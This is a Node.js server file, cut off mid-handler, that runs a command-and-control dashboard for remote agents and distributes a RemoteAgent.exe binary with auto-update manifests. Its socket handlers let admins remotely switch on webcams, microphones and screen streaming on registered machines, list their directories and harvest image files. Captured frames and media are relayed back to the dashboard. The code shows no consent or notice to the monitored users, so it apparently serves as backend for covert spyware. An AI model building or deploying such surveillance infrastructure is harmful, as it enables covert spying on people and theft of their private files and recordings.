require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const fsPromises = require('fs/promises');
const crypto = require('crypto');
const firebaseAdmin = require('firebase-admin');

const PORT = Number(process.env.PORT) || 3000;
const CLIENT_ORIGIN = process.env.CLIENT_ORIGIN || '*';
const TRUST_PROXY = process.env.TRUST_PROXY || 'true';
const VISITOR_COLLECTION = process.env.FIREBASE_VISITOR_COLLECTION || 'visitor_ips';
const BLOCKED_IP_CACHE_TTL_MS = Math.max(Number(process.env.BLOCKED_IP_CACHE_TTL_MS) || 30000, 5000);
const ADMIN_ROOM = 'admins';
const VIEWER_ROOM = 'viewers';
const AGENT_ROOM = 'agents';
const AGENT_STATIC_ROUTE = '/agent';
const STREAM_VIEWER_ROUTE = '/live-stream';
const AGENT_UPDATES_DIR = path.join(__dirname, 'agent-updates');
const STREAM_VIEWER_DIR = path.join(__dirname, 'stream-viewer');
const AGENT_BINARY_NAME = process.env.AGENT_BINARY_NAME || 'RemoteAgent.exe';
const AGENT_MANIFEST_NAME = process.env.AGENT_MANIFEST_NAME || 'latest.json';
const AGENT_DOWNLOAD_BASE_URL = String(process.env.AGENT_DOWNLOAD_BASE_URL || '').trim().replace(/\/+$/, '');
const AGENT_BINARY_UPLOAD_LIMIT_MB = Math.max(Number(process.env.AGENT_BINARY_UPLOAD_LIMIT_MB) || 300, 50);
const AGENT_BINARY_MIN_SIZE_BYTES = Math.max(Number(process.env.AGENT_BINARY_MIN_SIZE_BYTES) || (5 * 1024 * 1024), 1024 * 1024);
const PYINSTALLER_CARCHIVE_MAGIC = Buffer.from([0x4d, 0x45, 0x49, 0x0c, 0x0b, 0x0a, 0x0b, 0x0e]);

fs.mkdirSync(AGENT_UPDATES_DIR, { recursive: true });

const firebasePublicConfig = {
    apiKey: process.env.FIREBASE_API_KEY,
    authDomain: process.env.FIREBASE_AUTH_DOMAIN || (process.env.FIREBASE_PROJECT_ID ? `${process.env.FIREBASE_PROJECT_ID}.firebaseapp.com` : undefined),
    projectId: process.env.FIREBASE_PROJECT_ID,
    appId: process.env.FIREBASE_APP_ID
};

const hasPublicFirebaseConfig = Boolean(
    firebasePublicConfig.apiKey
    && firebasePublicConfig.authDomain
    && firebasePublicConfig.projectId
);

const firebasePrivateKey = process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n');
const hasServiceAccountConfig = Boolean(
    process.env.FIREBASE_PROJECT_ID
    && process.env.FIREBASE_CLIENT_EMAIL
    && firebasePrivateKey
);

let firebaseAdminReady = false;

if (hasServiceAccountConfig) {
    if (!firebaseAdmin.apps.length) {
        firebaseAdmin.initializeApp({
            credential: firebaseAdmin.credential.cert({
                projectId: process.env.FIREBASE_PROJECT_ID,
                clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
                privateKey: firebasePrivateKey
            })
        });
    }
    firebaseAdminReady = true;
} else {
    console.warn('[auth] Firebase Admin is not fully configured. Dashboard login will fail until service account env vars are set.');
}

const allowedOrigins = CLIENT_ORIGIN === '*'
    ? '*'
    : CLIENT_ORIGIN.split(',').map((origin) => origin.trim()).filter(Boolean);

const isOriginAllowed = (origin = '') => {
    if (!origin) {
        return false;
    }

    if (allowedOrigins === '*') {
        return true;
    }

    return allowedOrigins.includes(origin);
};

const app = express();

app.use((req, res, next) => {
    const requestOrigin = req.headers.origin;

    if (!requestOrigin) {
        next();
        return;
    }

    if (allowedOrigins === '*') {
        res.setHeader('Access-Control-Allow-Origin', '*');
    } else if (isOriginAllowed(requestOrigin)) {
        res.setHeader('Access-Control-Allow-Origin', requestOrigin);
        res.append('Vary', 'Origin');
    }

    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        if (allowedOrigins !== '*' && !isOriginAllowed(requestOrigin)) {
            res.sendStatus(403);
            return;
        }

        res.sendStatus(204);
        return;
    }

    next();
});

app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: allowedOrigins,
        methods: ['GET', 'POST']
    }
});

const parseBearerToken = (headerValue = '') => {
    if (typeof headerValue !== 'string') {
        return '';
    }

    const [scheme, token] = headerValue.trim().split(' ');
    if (!scheme || !token || !/^Bearer$/i.test(scheme)) {
        return '';
    }

    return token.trim();
};

const parseTrustProxyValue = (value) => {
    const normalized = String(value || '').trim().toLowerCase();

    if (!normalized || ['1', 'true', 'yes', 'on'].includes(normalized)) {
        return true;
    }

    if (['0', 'false', 'no', 'off'].includes(normalized)) {
        return false;
    }

    const hops = Number(normalized);
    if (Number.isInteger(hops) && hops >= 0) {
        return hops;
    }

    return value;
};

const normalizeIp = (value = '') => {
    if (typeof value !== 'string') {
        return '';
    }

    let ip = value.trim();
    if (!ip) {
        return '';
    }

    if (ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }

    if (ip.startsWith('::ffff:')) {
        ip = ip.slice('::ffff:'.length);
    }

    if (ip === '::1') {
        return '127.0.0.1';
    }

    return ip;
};

const getRequestIp = (req) => {
    const forwardedFor = req.headers['x-forwarded-for'];
    const forwarded = Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor;

    return normalizeIp(forwarded || req.ip || req.socket?.remoteAddress || '');
};

const getSocketIp = (socket) => {
    const forwardedFor = socket.handshake.headers?.['x-forwarded-for'];
    const forwarded = Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor;

    return normalizeIp(forwarded || socket.handshake.address || socket.conn?.remoteAddress || '');
};

const safeDecodeURIComponent = (value) => {
    try {
        return decodeURIComponent(value);
    } catch (error) {
        return value;
    }
};

const sanitizeVersion = (value = '') => String(value || '').trim().replace(/[^0-9A-Za-z._-]/g, '');

const getAgentManifestPath = () => path.join(AGENT_UPDATES_DIR, AGENT_MANIFEST_NAME);
const getAgentBinaryPath = () => path.join(AGENT_UPDATES_DIR, AGENT_BINARY_NAME);

const createSha256 = (buffer) => crypto.createHash('sha256').update(buffer).digest('hex');

const isLikelyPyInstallerOneFileExe = (buffer) => {
    if (!Buffer.isBuffer(buffer)) {
        return false;
    }

    if (buffer.length < AGENT_BINARY_MIN_SIZE_BYTES) {
        return false;
    }

    const hasMzHeader = buffer.length >= 2 && buffer[0] === 0x4d && buffer[1] === 0x5a;
    if (!hasMzHeader) {
        return false;
    }

    return buffer.includes(PYINSTALLER_CARCHIVE_MAGIC);
};

const buildPublicBaseFromRequest = (req) => {
    const protocol = req.protocol || 'https';
    const host = req.get('host') || '';
    return `${protocol}://${host}${AGENT_STATIC_ROUTE}`;
};

const getAgentDownloadBaseUrl = (req) => AGENT_DOWNLOAD_BASE_URL || buildPublicBaseFromRequest(req);

const buildAgentManifest = ({ req, version, sha256, fileName = AGENT_BINARY_NAME, extra = {} }) => {
    const versionValue = sanitizeVersion(version);
    const baseUrl = getAgentDownloadBaseUrl(req).replace(/\/+$/, '');
    const normalizedSha256 = String(sha256 || '').toLowerCase();
    const binaryUrl = `${baseUrl}/${encodeURIComponent(fileName)}`;
    const cacheBustingParams = new URLSearchParams();

    if (versionValue) {
        cacheBustingParams.set('v', versionValue);
    }

    if (normalizedSha256) {
        cacheBustingParams.set('sha256', normalizedSha256.slice(0, 16));
    }

    const urlWithVersion = cacheBustingParams.toString()
        ? `${binaryUrl}?${cacheBustingParams.toString()}`
        : binaryUrl;

    return {
        version: versionValue,
        url: urlWithVersion,
        sha256: normalizedSha256,
        releasedAt: new Date().toISOString(),
        ...extra
    };
};

const firestoreDb = firebaseAdminReady ? firebaseAdmin.firestore() : null;
const blockedIpCache = {
    ips: new Set(),
    lastSyncedAt: 0
};

app.set('trust proxy', parseTrustProxyValue(TRUST_PROXY));

const refreshBlockedIpCache = async (force = false) => {
    if (!firestoreDb) {
        return;
    }

    if (!force && (Date.now() - blockedIpCache.lastSyncedAt) < BLOCKED_IP_CACHE_TTL_MS) {
        return;
    }

    const blockedSnapshot = await firestoreDb
        .collection(VISITOR_COLLECTION)
        .where('blocked', '==', true)
        .get();

    const nextCache = new Set();
    blockedSnapshot.forEach((docSnapshot) => {
        const data = docSnapshot.data() || {};
        const ip = normalizeIp(data.ip || safeDecodeURIComponent(docSnapshot.id));
        if (ip) {
            nextCache.add(ip);
        }
    });

    blockedIpCache.ips = nextCache;
    blockedIpCache.lastSyncedAt = Date.now();
};

const isIpBlocked = async (ip) => {
    if (!firestoreDb || !ip) {
        return false;
    }

    await refreshBlockedIpCache();
    return blockedIpCache.ips.has(ip);
};

const recordVisitorVisit = async ({
    ip,
    pathName,
    method,
    userAgent,
    source
}) => {
    if (!firestoreDb || !ip) {
        return;
    }

    const now = firebaseAdmin.firestore.FieldValue.serverTimestamp();
    const increment = firebaseAdmin.firestore.FieldValue.increment(1);

    await firestoreDb.collection(VISITOR_COLLECTION).doc(encodeURIComponent(ip)).set({
        ip,
        lastSeenAt: now,
        totalVisits: increment,
        lastPath: pathName || '/',
        lastMethod: method || 'GET',
        lastUserAgent: userAgent || '',
        lastSource: source || 'http',
        updatedAt: now
    }, { merge: true });
};

const requireAdmin = async (req, res, next) => {
    if (!firebaseAdminReady) {
        res.status(503).json({ error: 'Firebase authentication is not configured on this server.' });
        return;
    }

    const idToken = parseBearerToken(req.headers.authorization || '');
    if (!idToken) {
        res.status(401).json({ error: 'Missing Bearer token.' });
        return;
    }

    try {
        const decodedToken = await firebaseAdmin.auth().verifyIdToken(idToken, true);
        req.adminUser = {
            uid: decodedToken.uid,
            email: decodedToken.email || ''
        };
        next();
    } catch (error) {
        res.status(401).json({ error: 'Unauthorized' });
    }
};

const disconnectSocketsByIp = (ipAddress) => {
    if (!ipAddress) {
        return;
    }

    io.of('/').sockets.forEach((connectedSocket) => {
        if (connectedSocket.data?.clientIp === ipAddress) {
            connectedSocket.disconnect(true);
        }
    });
};

if (firestoreDb) {
    refreshBlockedIpCache(true)
        .then(() => {
            console.log(`[ip-security] Enabled (collection: ${VISITOR_COLLECTION})`);
        })
        .catch((error) => {
            console.error(`[ip-security] Could not load blocked IP list: ${error.message}`);
        });
} else {
    console.warn('[ip-security] Disabled because Firebase Admin SDK is not configured.');
}

app.use(async (req, res, next) => {
    if (req.path === '/health') {
        return next();
    }

    const clientIp = getRequestIp(req);
    req.clientIp = clientIp;

    if (!firestoreDb || !clientIp) {
        return next();
    }

    try {
        const blocked = await isIpBlocked(clientIp);
        if (blocked) {
            await recordVisitorVisit({
                ip: clientIp,
                pathName: req.path,
                method: req.method,
                userAgent: req.get('user-agent') || '',
                source: 'blocked-http'
            });

            res.status(403).json({ error: 'Your IP has been blocked from this website.' });
            return;
        }
    } catch (error) {
        console.error(`[ip-security] Failed to check block list: ${error.message}`);
    }

    recordVisitorVisit({
        ip: clientIp,
        pathName: req.path,
        method: req.method,
        userAgent: req.get('user-agent') || '',
        source: 'http'
    }).catch((error) => {
        console.error(`[ip-security] Failed to store visitor log: ${error.message}`);
    });

    next();
});

io.use(async (socket, next) => {
    const clientIp = getSocketIp(socket);
    socket.data.clientIp = clientIp;

    if (clientIp && firestoreDb) {
        try {
            const blocked = await isIpBlocked(clientIp);
            if (blocked) {
                await recordVisitorVisit({
                    ip: clientIp,
                    pathName: '/socket.io',
                    method: 'WS',
                    userAgent: socket.handshake.headers?.['user-agent'] || '',
                    source: 'blocked-socket'
                });

                return next(new Error('Blocked'));
            }
        } catch (error) {
            console.error(`[ip-security] Socket block check failed: ${error.message}`);
        }
    }

    const clientTypeRaw = socket.handshake.auth?.clientType || socket.handshake.query?.clientType;
    const clientType = String(clientTypeRaw || '').trim().toLowerCase();
    const tokenFromAuth = socket.handshake.auth?.token;
    const tokenFromHeader = parseBearerToken(socket.handshake.headers?.authorization);
    const idToken = tokenFromAuth || tokenFromHeader;

    if (!idToken) {
        if (clientType === 'viewer') {
            socket.data.role = 'viewer';
            recordVisitorVisit({
                ip: clientIp,
                pathName: '/socket.io',
                method: 'WS',
                userAgent: socket.handshake.headers?.['user-agent'] || '',
                source: 'socket-viewer'
            }).catch((error) => {
                console.error(`[ip-security] Failed to store socket viewer: ${error.message}`);
            });
            return next();
        }

        socket.data.role = 'agent';
        recordVisitorVisit({
            ip: clientIp,
            pathName: '/socket.io',
            method: 'WS',
            userAgent: socket.handshake.headers?.['user-agent'] || '',
            source: 'socket-agent'
        }).catch((error) => {
            console.error(`[ip-security] Failed to store socket visitor: ${error.message}`);
        });
        return next();
    }

    if (!firebaseAdminReady) {
        return next(new Error('Firebase authentication is not configured on this server.'));
    }

    try {
        const decodedToken = await firebaseAdmin.auth().verifyIdToken(idToken, true);
        socket.data.role = 'admin';
        socket.data.user = {
            uid: decodedToken.uid,
            email: decodedToken.email || ''
        };

        recordVisitorVisit({
            ip: clientIp,
            pathName: '/socket.io',
            method: 'WS',
            userAgent: socket.handshake.headers?.['user-agent'] || '',
            source: 'socket-admin'
        }).catch((error) => {
            console.error(`[ip-security] Failed to store admin socket visitor: ${error.message}`);
        });

        return next();
    } catch (error) {
        return next(new Error('Unauthorized'));
    }
});

let agents = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
    res.status(200).json({ ok: true });
});

app.use(AGENT_STATIC_ROUTE, express.static(AGENT_UPDATES_DIR, {
    fallthrough: true,
    setHeaders: (res, filePath) => {
        const servedFileName = path.basename(filePath);

        if (servedFileName === AGENT_MANIFEST_NAME) {
            res.setHeader('Content-Type', 'application/json; charset=utf-8');
            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
            return;
        }

        if (servedFileName === AGENT_BINARY_NAME || filePath.endsWith('.exe')) {
            res.setHeader('Content-Type', 'application/octet-stream');
            res.setHeader('Content-Disposition', `attachment; filename="${AGENT_BINARY_NAME}"`);
            res.setHeader('Cache-Control', 'public, max-age=60, must-revalidate');
            return;
        }

        res.setHeader('Cache-Control', 'public, max-age=300');
    }
}));

if (fs.existsSync(STREAM_VIEWER_DIR)) {
    app.use(STREAM_VIEWER_ROUTE, express.static(STREAM_VIEWER_DIR, {
        index: 'live-stream.html',
        extensions: ['html', 'js', 'css']
    }));
}

app.get(`${AGENT_STATIC_ROUTE}/${AGENT_MANIFEST_NAME}`, async (req, res) => {
    const manifestPath = getAgentManifestPath();

    try {
        const manifestRaw = await fsPromises.readFile(manifestPath, 'utf8');
        res.type('application/json').status(200).send(manifestRaw);
    } catch (error) {
        res.status(404).json({
            error: 'Agent manifest not found. Publish a release first.',
            uploadEndpoint: '/admin/agent/release/upload',
            manifestEndpoint: '/admin/agent/release/manifest'
        });
    }
});

app.get('/admin/agent/release', requireAdmin, async (req, res) => {
    const manifestPath = getAgentManifestPath();

    try {
        const manifestRaw = await fsPromises.readFile(manifestPath, 'utf8');
        const manifest = JSON.parse(manifestRaw);
        res.status(200).json({ ok: true, manifest });
    } catch (error) {
        res.status(404).json({ ok: false, error: 'No published agent release found.' });
    }
});

app.put(
    '/admin/agent/release/upload',
    requireAdmin,
    express.raw({ type: 'application/octet-stream', limit: `${AGENT_BINARY_UPLOAD_LIMIT_MB}mb` }),
    async (req, res) => {
        const version = sanitizeVersion(req.query.version || req.headers['x-agent-version'] || '');
        if (!version) {
            res.status(400).json({ error: 'Missing version. Use query ?version=2026.04.04.223733' });
            return;
        }

        if (!Buffer.isBuffer(req.body) || req.body.length === 0) {
            res.status(400).json({ error: 'Binary body is required (application/octet-stream).' });
            return;
        }

        if (!isLikelyPyInstallerOneFileExe(req.body)) {
            res.status(400).json({
                error: `Uploaded binary looks invalid/corrupted. Please upload fresh dist/RemoteAgent.exe (>= ${Math.ceil(AGENT_BINARY_MIN_SIZE_BYTES / (1024 * 1024))}MB).`
            });
            return;
        }

        const binaryPath = getAgentBinaryPath();
        const tempPath = `${binaryPath}.tmp`;

        try {
            await fsPromises.writeFile(tempPath, req.body);
            await fsPromises.rename(tempPath, binaryPath);

            const sha256 = createSha256(req.body);
            const manifest = buildAgentManifest({ req, version, sha256 });
            const manifestPath = getAgentManifestPath();

            await fsPromises.writeFile(manifestPath, JSON.stringify(manifest, null, 2), 'utf8');

            io.to(ADMIN_ROOM).emit('agent_release_updated', manifest);

            res.status(200).json({
                ok: true,
                manifest,
                bytes: req.body.length,
                manifestUrl: `${getAgentDownloadBaseUrl(req)}/${encodeURIComponent(AGENT_MANIFEST_NAME)}`
            });
        } catch (error) {
            await fsPromises.unlink(tempPath).catch(() => {});
            res.status(500).json({ error: `Failed to publish agent release: ${error.message}` });
        }
    }
);

app.post('/admin/agent/release/manifest', requireAdmin, async (req, res) => {
    const version = sanitizeVersion(req.body?.version || '');
    const downloadUrl = String(req.body?.url || '').trim();
    const sha256 = String(req.body?.sha256 || '').trim().toLowerCase();

    if (!version) {
        res.status(400).json({ error: 'version is required.' });
        return;
    }

    if (!downloadUrl) {
        res.status(400).json({ error: 'url is required.' });
        return;
    }

    const manifest = {
        version,
        url: downloadUrl,
        sha256,
        releasedAt: new Date().toISOString()
    };

    try {
        await fsPromises.writeFile(getAgentManifestPath(), JSON.stringify(manifest, null, 2), 'utf8');
        io.to(ADMIN_ROOM).emit('agent_release_updated', manifest);
        res.status(200).json({ ok: true, manifest });
    } catch (error) {
        res.status(500).json({ error: `Failed to save manifest: ${error.message}` });
    }
});

app.get('/firebase-config', (req, res) => {
    if (!hasPublicFirebaseConfig) {
        res.status(500).json({ error: 'Firebase public config is missing on server.' });
        return;
    }

    res.status(200).json(firebasePublicConfig);
});

app.get('/admin/visitors', requireAdmin, async (req, res) => {
    if (!firestoreDb) {
        res.status(503).json({ error: 'Visitor tracking is not configured.' });
        return;
    }

    try {
        const requestedLimit = Number(req.query.limit);
        const limit = Number.isFinite(requestedLimit)
            ? Math.min(Math.max(requestedLimit, 1), 200)
            : 50;

        const snapshot = await firestoreDb
            .collection(VISITOR_COLLECTION)
            .orderBy('lastSeenAt', 'desc')
            .limit(limit)
            .get();

        const visitors = snapshot.docs.map((docSnapshot) => ({
            id: docSnapshot.id,
            ...docSnapshot.data()
        }));

        res.status(200).json({ visitors });
    } catch (error) {
        res.status(500).json({ error: `Failed to load visitors: ${error.message}` });
    }
});

app.get('/admin/blocked-ips', requireAdmin, async (req, res) => {
    if (!firestoreDb) {
        res.status(503).json({ error: 'Visitor tracking is not configured.' });
        return;
    }

    try {
        const snapshot = await firestoreDb
            .collection(VISITOR_COLLECTION)
            .where('blocked', '==', true)
            .get();

        const blockedIps = snapshot.docs.map((docSnapshot) => ({
            id: docSnapshot.id,
            ...docSnapshot.data()
        }));

        res.status(200).json({ blockedIps });
    } catch (error) {
        res.status(500).json({ error: `Failed to load blocked IP list: ${error.message}` });
    }
});

app.post('/admin/blocked-ips/block', requireAdmin, async (req, res) => {
    if (!firestoreDb) {
        res.status(503).json({ error: 'Visitor tracking is not configured.' });
        return;
    }

    const ip = normalizeIp(req.body?.ip || '');
    const reason = typeof req.body?.reason === 'string' ? req.body.reason.trim() : '';

    if (!ip) {
        res.status(400).json({ error: 'A valid IP is required.' });
        return;
    }

    try {
        const now = firebaseAdmin.firestore.FieldValue.serverTimestamp();
        await firestoreDb.collection(VISITOR_COLLECTION).doc(encodeURIComponent(ip)).set({
            ip,
            blocked: true,
            blockedAt: now,
            blockedBy: req.adminUser.email || req.adminUser.uid,
            blockReason: reason,
            updatedAt: now
        }, { merge: true });

        blockedIpCache.ips.add(ip);
        blockedIpCache.lastSyncedAt = Date.now();
        disconnectSocketsByIp(ip);

        res.status(200).json({ ok: true, ip, blocked: true });
    } catch (error) {
        res.status(500).json({ error: `Failed to block IP: ${error.message}` });
    }
});

app.post('/admin/blocked-ips/unblock', requireAdmin, async (req, res) => {
    if (!firestoreDb) {
        res.status(503).json({ error: 'Visitor tracking is not configured.' });
        return;
    }

    const ip = normalizeIp(req.body?.ip || '');
    if (!ip) {
        res.status(400).json({ error: 'A valid IP is required.' });
        return;
    }

    try {
        const now = firebaseAdmin.firestore.FieldValue.serverTimestamp();
        const fieldDelete = firebaseAdmin.firestore.FieldValue.delete();

        await firestoreDb.collection(VISITOR_COLLECTION).doc(encodeURIComponent(ip)).set({
            ip,
            blocked: false,
            unblockedAt: now,
            unblockedBy: req.adminUser.email || req.adminUser.uid,
            blockReason: fieldDelete,
            blockedAt: fieldDelete,
            blockedBy: fieldDelete,
            updatedAt: now
        }, { merge: true });

        blockedIpCache.ips.delete(ip);
        blockedIpCache.lastSyncedAt = Date.now();

        res.status(200).json({ ok: true, ip, blocked: false });
    } catch (error) {
        res.status(500).json({ error: `Failed to unblock IP: ${error.message}` });
    }
});

io.on('connection', (socket) => {
    const isAdmin = socket.data.role === 'admin';
    const isViewer = socket.data.role === 'viewer';

    if (isAdmin) {
        socket.join(ADMIN_ROOM);
        console.log(`[admin] connected: ${socket.id} (${socket.data.user?.email || 'unknown'})`);
        socket.emit('update_agent_list', Object.values(agents));
    } else if (isViewer) {
        socket.join(VIEWER_ROOM);
        console.log(`[viewer] connected: ${socket.id}`);
        socket.emit('update_agent_list', Object.values(agents));
    } else {
        socket.join(AGENT_ROOM);
        console.log(`[agent-socket] connected: ${socket.id}`);
    }

    const emitAgentList = () => {
        const agentList = Object.values(agents);
        io.to(ADMIN_ROOM).emit('update_agent_list', agentList);
        io.to(VIEWER_ROOM).emit('update_agent_list', agentList);
    };

    const emitControl = (eventName, payload = {}) => {
        const normalizedPayload = payload && typeof payload === 'object' ? payload : {};
        const targetId = normalizedPayload.targetId;
        const { targetId: _, ...agentPayload } = normalizedPayload;

        if (targetId) {
            const targetSocket = io.sockets.sockets.get(targetId);
            if (!targetSocket || !agents[targetId]) {
                return {
                    ok: false,
                    scope: 'single',
                    targetId,
                    sentCount: 0,
                    reason: 'target-offline'
                };
            }

            io.to(targetId).emit(eventName, agentPayload);
            return {
                ok: true,
                scope: 'single',
                targetId,
                sentCount: 1
            };
        }

        const onlineAgents = Object.keys(agents).filter((agentId) => io.sockets.sockets.has(agentId));
        if (!onlineAgents.length) {
            return {
                ok: false,
                scope: 'all',
                sentCount: 0,
                reason: 'no-agents-online'
            };
        }

        io.to(AGENT_ROOM).emit(eventName, agentPayload);
        return {
            ok: true,
            scope: 'all',
            sentCount: onlineAgents.length
        };
    };

    const emitControlAck = (action, result) => {
        io.to(socket.id).emit('ui_control_ack', {
            action,
            ...result,
            requestedAt: Date.now()
        });
    };

    socket.on('register_node', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const machineName = data.machine || 'Unknown-PC';

        agents[socket.id] = {
            machine: machineName,
            id: socket.id,
            recording: false,
            cameraOn: false,
            voiceRecording: false,
            screenStreaming: false,
            imageSyncRunning: false,
            imageSyncNextIndex: 0,
            imageSyncTotalFiles: 0
        };
        console.log(`[agent] registered: ${machineName} (${socket.id})`);
        emitAgentList();
    });

    socket.on('agent_state_update', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const previous = agents[socket.id] || { id: socket.id, machine: data.machine || 'Unknown-PC' };
        const hasRecording = typeof data.recording === 'boolean';
        const hasCameraOn = typeof data.cameraOn === 'boolean';
        const hasVoiceRecording = typeof data.voiceRecording === 'boolean';
        const hasScreenStreaming = typeof data.screenStreaming === 'boolean';

        agents[socket.id] = {
            ...previous,
            machine: data.machine || previous.machine,
            recording: hasRecording ? data.recording : Boolean(previous.recording),
            cameraOn: hasCameraOn ? data.cameraOn : Boolean(previous.cameraOn),
            voiceRecording: hasVoiceRecording ? data.voiceRecording : Boolean(previous.voiceRecording),
            screenStreaming: hasScreenStreaming ? data.screenStreaming : Boolean(previous.screenStreaming),
            lastStateAt: Date.now()
        };

        emitAgentList();
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_agent_state', {
            agentId: socket.id,
            machine: agents[socket.id].machine,
            recording: agents[socket.id].recording,
            cameraOn: agents[socket.id].cameraOn,
            voiceRecording: agents[socket.id].voiceRecording,
            screenStreaming: agents[socket.id].screenStreaming,
            source: data.source || 'agent'
        });
    });

    // Recording Controls
    socket.on('admin_start_capture', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('start_capture', payload);
        emitControlAck('start_capture', result);
    });
    socket.on('admin_stop_capture', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_capture', payload);
        emitControlAck('stop_capture', result);
    });

    socket.on('admin_start_all', () => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('start_capture');
        emitControlAck('start_capture', result);
    });
    socket.on('admin_stop_all', () => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_capture');
        emitControlAck('stop_capture', result);
    });

    // Camera Controls
    socket.on('admin_start_camera', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('start_camera', payload);
        emitControlAck('start_camera', result);
    });
    socket.on('admin_stop_camera', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_camera', payload);
        emitControlAck('stop_camera', result);
    });

    socket.on('admin_start_voice', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('start_voice_capture', payload);
        emitControlAck('start_voice_capture', result);
    });

    socket.on('admin_stop_voice', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_voice_capture', payload);
        emitControlAck('stop_voice_capture', result);
    });

    socket.on('admin_start_screen_stream', (payload) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const result = emitControl('start_screen_stream', payload);
        emitControlAck('start_screen_stream', result);
    });

    socket.on('admin_stop_screen_stream', (payload) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const result = emitControl('stop_screen_stream', payload);
        emitControlAck('stop_screen_stream', result);
    });

    socket.on('admin_webrtc_offer', (payload = {}) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const data = {
            ...payload,
            viewerSocketId: socket.id
        };
        const result = emitControl('webrtc_offer', data);
        emitControlAck('webrtc_offer', result);
    });

    socket.on('admin_webrtc_ice_candidate', (payload = {}) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const data = {
            ...payload,
            viewerSocketId: socket.id
        };
        emitControl('webrtc_ice_candidate', data);
    });

    socket.on('admin_webrtc_stop', (payload = {}) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const data = {
            ...payload,
            viewerSocketId: socket.id
        };
        const result = emitControl('webrtc_stop', data);
        emitControlAck('webrtc_stop', result);
    });

    socket.on('admin_find_image_and_save', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('find_image_and_save', payload);
        emitControlAck('find_image_and_save', result);
    });

    socket.on('admin_stop_image_sync', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_image_sync', payload);
        emitControlAck('stop_image_sync', result);
    });

    socket.on('admin_reset_image_sync', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('reset_image_sync', payload);
        emitControlAck('reset_image_sync', result);
    });

    socket.on('admin_get_image_sync_status', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('get_image_sync_status', payload);
        emitControlAck('get_image_sync_status', result);
    });

    socket.on('admin_list_directories', (payload = {}) => {
        if (!isAdmin) {
            return;
        }
        emitControl('list_directories', payload);
    });

    // Relay Camera Frames from Agent to Dashboard
    socket.on('camera_frame', (data) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_camera_display', {
            ...data,
            agentId: socket.id,
            machine: agent.machine
        });
    });

    socket.on('screen_stream_frame', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_screen_stream_frame', {
            ...data,
            agentId: socket.id,
            machine: agent.machine,
            sentAt: Date.now()
        });
    });

    socket.on('webrtc_answer', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }
        const viewerSocketId = data.viewerSocketId;
        if (!viewerSocketId) {
            return;
        }
        io.to(viewerSocketId).emit('webrtc_answer', {
            ...data,
            agentId: socket.id
        });
    });

    socket.on('webrtc_ice_candidate', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }
        const viewerSocketId = data.viewerSocketId;
        if (!viewerSocketId) {
            return;
        }
        io.to(viewerSocketId).emit('webrtc_ice_candidate', {
            ...data,
            agentId: socket.id
        });
    });

    socket.on('webrtc_status', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }
        const viewerSocketId = data.viewerSocketId;
        if (!viewerSocketId) {
            return;
        }
        io.to(viewerSocketId).emit('webrtc_status', {
            ...data,
            agentId: socket.id
        });
    });

    socket.on('video_upload_complete', (data) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
            ...data,
            mediaType: data?.mediaType || 'video',
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('audio_upload_complete', (data) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
            ...data,
            mediaType: 'audio',
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('image_upload_complete', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
            ...data,
            mediaType: 'image',
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('image_sync_status', (data = {}) => {
